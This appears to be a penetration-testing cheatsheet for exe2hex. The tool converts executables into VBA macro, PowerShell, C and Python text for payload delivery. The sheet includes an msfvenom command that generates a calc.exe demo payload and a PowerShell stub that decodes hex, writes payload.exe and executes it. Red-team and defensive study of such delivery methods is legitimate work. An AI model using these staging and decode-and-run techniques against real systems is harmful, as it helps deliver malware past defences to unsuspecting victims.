# exe2hex Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt update && sudo apt install exe2hex
# Or from source:
git clone https://github.com/g0tm1k/exe2hex.git
```

### Basic Conversion

```bash
# EXE to hex string
python3 exe2hex.py -x payload.exe -o payload.hex

# To C array
python3 exe2hex.py -x payload.exe -c -o payload.c

# To VBA macro
python3 exe2hex.py -x payload.exe -v -o macro.txt

# To PowerShell
python3 exe2hex.py -x payload.exe -p -o payload_ps.txt

# To Python
python3 exe2hex.py -x payload.exe --python -o payload_py.txt
```

### Output Formats

| Flag | Format | Use Case |
|------|--------|----------|
| `-c` | C array | Embed in C/C++ code |
| `-v` | VBA macro | Office document delivery |
| `-p` | PowerShell | PS-based execution |
| `--python` | Python | Script-based delivery |
| (default) | Hex string | General use |

### Integration with MSFvenom

```bash
# Generate and convert
msfvenom -p windows/exec CMD="calc.exe" -f exe -o calc.exe
python3 exe2hex.py -x calc.exe -p -o calc_hex.ps1
```

### Batch Conversion

```bash
for f in *.exe; do
    python3 exe2hex.py -x "$f" -c -o "${f%.exe}_c.txt"
    python3 exe2hex.py -x "$f" -p -o "${f%.exe}_ps.txt"
    python3 exe2hex.py -x "$f" -v -o "${f%.exe}_vba.txt"
done
```

### PowerShell Payload Decoding

```powershell
$hex = "4D5A90000300..."  # From exe2hex output
$bytes = [System.Convert]::FromHexString($hex)
[System.IO.File]::WriteAllBytes("C:\temp\payload.exe", $bytes)
Start-Process "C:\temp\payload.exe"
```

### Key Flags

| Flag | Description |
|------|-------------|
| `-x` | Input PE file |
| `-o` | Output file |
| `-c` | C array format |
| `-v` | VBA macro format |
| `-p` | PowerShell format |
| `--python` | Python format |

### Troubleshooting

```bash
# Not a valid PE → verify file type
file target.exe

# Output too large → use head for chunks
python3 exe2hex.py -x large.exe -p | head -c 10000 > chunk.txt
```
